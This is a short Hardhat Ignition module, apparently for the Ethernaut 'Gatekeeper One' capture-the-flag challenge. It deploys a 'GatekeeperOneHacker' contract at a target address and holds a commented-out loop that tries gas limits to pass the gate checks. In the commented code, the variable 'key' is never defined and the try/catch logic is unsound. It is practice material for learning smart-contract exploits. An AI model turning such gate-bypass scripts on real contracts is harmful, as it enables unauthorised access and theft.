import { buildModule } from "@nomicfoundation/hardhat-ignition/modules";

export default buildModule("GatekeeperModule", (m) => {
    // Deploy contracts
    const gateKeeperAddress = "0xBE55Cd6C38f47119DA10d13Ec9c3a7d149960eC3";
    const gatekeeperOneHacker = m.contract("GatekeeperOneHacker", [gateKeeperAddress]);
    console.log('deployed hacker: ', gatekeeperOneHacker.contractName);
    // return { gatekeeperOneHacker };

    // Use the first signer as the attacker

    // --- Empirical gas window ---
    // const empiricalStart = 205190n;
    // const empiricalEnd = 205200n;

    // // Compute derived key once
    // const keyFuture = m.call(gatekeeperOneHacker, "getDerivedKey", ["0x637875145e0Da1054A1C8259828257704BD78398"]);
    // // Iterate over empirical gas values
    // for (let gasLimit = empiricalStart; gasLimit <= empiricalEnd; gasLimit++) {
    //     try {
    //         m.call(gatekeeperOneHacker, "callEnter", [key, gasLimit], { gasLimit: 1_000_000n });
    //         console.log(`✅ Attempted callEnter with gas ${gasLimit}n`);
    //         break; // stop at first success
    //     } catch (err) {
    //         console.log(`❌ Failed gas ${gasLimit}n, continuing`);
    //     }
    // }

    // return { gatekeeperOneHacker };
});
